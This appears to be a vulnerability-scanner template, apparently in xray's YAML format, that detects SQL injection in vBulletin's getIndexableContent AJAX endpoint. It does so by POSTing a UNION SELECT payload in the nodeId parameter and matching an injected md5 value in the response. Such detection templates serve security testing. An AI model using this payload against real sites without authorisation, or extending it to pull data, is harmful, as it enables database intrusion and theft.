name: poc-yaml-vbulletin-getindexablecontent-sqli
manual: true
transport: http
set:
  s1: randomInt(100000, 999999)
rules:
  r0:
    request:
      method: POST
      path: /ajax/api/content_infraction/getIndexableContent
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: nodeId[nodeid]=1 AND text.nodeid = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,md5({{s1}}),19,20,21,22,23,24,25,26%23
      follow_redirects: true
    expression: response.status == 200 && response.body_string.contains(substr(md5(string(s1)), 2, 26))
expression: r0()
detail:
  author: Â∞èz